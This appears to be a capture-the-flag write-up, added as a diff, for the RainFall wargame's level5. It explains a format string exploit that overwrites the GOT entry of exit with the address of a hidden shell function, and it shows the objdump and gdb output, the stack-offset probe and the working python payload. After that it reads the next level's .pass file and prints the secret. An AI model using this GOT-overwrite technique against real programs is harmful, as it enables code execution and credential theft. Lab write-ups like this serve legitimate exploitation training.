@@ -1,0 +1,49 @@
+# after analyzing the binary with gdb and ghidra, it's also vulnerable to the format string attack
+# as our input is again supplied as format string to printf.
+# there's a function 'o' that isn't called in the program, yet it can open a shell for us.
+# first, I thought about overwriting a return address to go to function 'o', but the problem
+# is that function 'n' ends with a call to 'exit' not just a normal return.
+# a good solution would be: overwriting the GOT entry of function 'exit' to point to function 'o'.
+
+# let's get the address to the GOT entry of function 'exit':
+
+level5@RainFall:~$ objdump -R level5 | grep exit
+08049828 R_386_JUMP_SLOT   _exit
+08049838 R_386_JUMP_SLOT   exit
+
+# Good, it's 08049838, so we only need to change the content of this entry to 
+# become the address of the first instruction of function 'o'.
+# let's get the address to the function 'o':
+
+(gdb) disas o
+Dump of assembler code for function o:
+   0x080484a4 <+0>:	push   %ebp
+   0x080484a5 <+1>:	mov    %esp,%ebp
+   0x080484a7 <+3>:	sub    $0x18,%esp
+   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
+   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
+   0x080484b6 <+18>:	movl   $0x1,(%esp)
+   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
+End of assembler dump.
+
+# good it's 0x080484a4.
+
+# Let's check how far our input is from printf's perspective (the order in its arguments):
+
+level5@RainFall:~$ (python -c 'print "AAAA %x %x %x %x %x %x"'; cat) | ./level5
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
+
+# after the test it seems our input starts at the fourth printf argument. So let's change the start of 
+# the input to "\x38\x98\x04\x08" which is the address to the GOT entry of 'exit' in little endian.
+# and then try to overwrite the entry with the address to the function 'o'.
+# we'll use same trick that we used in level4 (%<alignment>d) with the address - 4.
+
+# Solution:
+
+level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"'; cat) | ./level5
+
+whoami
+level6
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
